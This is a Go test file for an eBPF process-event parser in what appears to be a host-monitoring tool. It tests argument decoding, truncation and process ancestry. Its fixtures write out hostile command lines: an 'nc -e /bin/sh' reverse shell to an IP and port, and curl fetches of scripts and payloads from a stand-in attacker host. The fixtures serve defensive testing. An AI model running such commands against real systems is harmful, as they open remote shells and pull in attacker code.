package ebpf

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Arguments are what separate "nc ran" from "nc -e /bin/sh 10.0.0.1 4444".
func TestParseProcessEventDecodesArgs(t *testing.T) {
	args := []string{"nc", "-e", "/bin/sh", "10.0.0.1", "4444"}
	ev := parseProcessEvent(buildExecRecFull(1, 2, 400, 0, 0, "nc", "/usr/bin/nc", nil, args, false))
	require.NotNil(t, ev)

	assert.Equal(t, args, ev.Args)
	assert.False(t, ev.ArgsTruncated)
	assert.Equal(t, "nc -e /bin/sh 10.0.0.1 4444", ev.CommandLine())
}

// An exec with no captured argv must report none rather than an empty string
// argument, and CommandLine falls back to the binary.
func TestParseProcessEventNoArgs(t *testing.T) {
	ev := parseProcessEvent(buildExecRecFull(1, 2, 400, 0, 0, "sh", "/bin/sh", nil, nil, false))
	require.NotNil(t, ev)
	assert.Empty(t, ev.Args)
	assert.False(t, ev.ArgsTruncated)
	assert.Equal(t, "/bin/sh", ev.CommandLine())
}

// A command line that did not fit is a prefix, and saying so matters: an
// analyst must not read a truncated line as the whole invocation.
func TestParseProcessEventTruncatedArgs(t *testing.T) {
	ev := parseProcessEvent(buildExecRecFull(1, 2, 400, 0, 0, "sh", "/bin/sh", nil,
		[]string{"sh", "-c", "a-very-long-command"}, true))
	require.NotNil(t, ev)
	assert.True(t, ev.ArgsTruncated)
	assert.True(t, strings.HasSuffix(ev.CommandLine(), " ..."),
		"a truncated command line must be marked as such")
}

// The kernel buffer is fixed, so a long command line is cut rather than
// overrunning. Nothing beyond the buffer may appear.
func TestParseProcessEventArgsAreBounded(t *testing.T) {
	long := make([]string, 0, 40)
	for i := 0; i < 40; i++ {
		long = append(long, strings.Repeat("x", 20))
	}
	ev := parseProcessEvent(buildExecRecFull(1, 2, 400, 0, 0, "x", "/x", nil, long, true))
	require.NotNil(t, ev)

	// Bytes consumed is the arguments plus one separator between each. The
	// final argument of a truncated blob has no trailing NUL, which is why
	// this counts separators rather than assuming one per argument.
	total := len(ev.Args) - 1
	for _, a := range ev.Args {
		total += len(a)
	}
	assert.LessOrEqual(t, total, ArgsMax, "decoded argv must not exceed the kernel buffer")
	assert.NotEmpty(t, ev.Args)
	assert.True(t, ev.ArgsTruncated, "a command line this long must be marked truncated")
}

// Args and ancestry occupy different parts of the record; decoding one must
// not disturb the other.
func TestParseProcessEventArgsAndAncestryTogether(t *testing.T) {
	chain := []Ancestor{{PID: 300, Comm: "sh"}, {PID: 200, Comm: "nginx"}}
	ev := parseProcessEvent(buildExecRecFull(7, 9, 400, 0, DeniedFlag, "curl", "/usr/bin/curl",
		chain, []string{"curl", "-sk", "https://evil.example/x.sh"}, false))
	require.NotNil(t, ev)

	assert.Equal(t, chain, ev.Ancestry)
	assert.Equal(t, "nginx -> sh -> curl", ev.AncestryChain())
	assert.Equal(t, []string{"curl", "-sk", "https://evil.example/x.sh"}, ev.Args)
	assert.Equal(t, "/usr/bin/curl", ev.Filename)
	assert.True(t, ev.Flags&DeniedFlag != 0)
}

// A trailing NUL must not decode into an empty final argument.
func TestParseProcessEventNoEmptyTrailingArg(t *testing.T) {
	ev := parseProcessEvent(buildExecRecFull(1, 2, 400, 0, 0, "sh", "/bin/sh", nil,
		[]string{"sh", "-c", "true"}, false))
	require.NotNil(t, ev)
	for _, a := range ev.Args {
		assert.NotEmpty(t, a, "no argument should decode as empty")
	}
	assert.Len(t, ev.Args, 3)
}

func BenchmarkParseProcessEventWithArgs(b *testing.B) {
	rec := buildExecRecFull(1, 2, 400, 0, 0, "curl", "/usr/bin/curl",
		[]Ancestor{{PID: 300, Comm: "sh"}},
		[]string{"curl", "-sk", "-o", "/tmp/x", "https://example.invalid/payload"}, false)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = parseProcessEvent(rec)
	}
}

func BenchmarkCommandLine(b *testing.B) {
	ev := &ProcessEvent{
		Filename: "/usr/bin/curl",
		Args:     []string{"curl", "-sk", "https://example.invalid/payload"},
	}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = ev.CommandLine()
	}
}
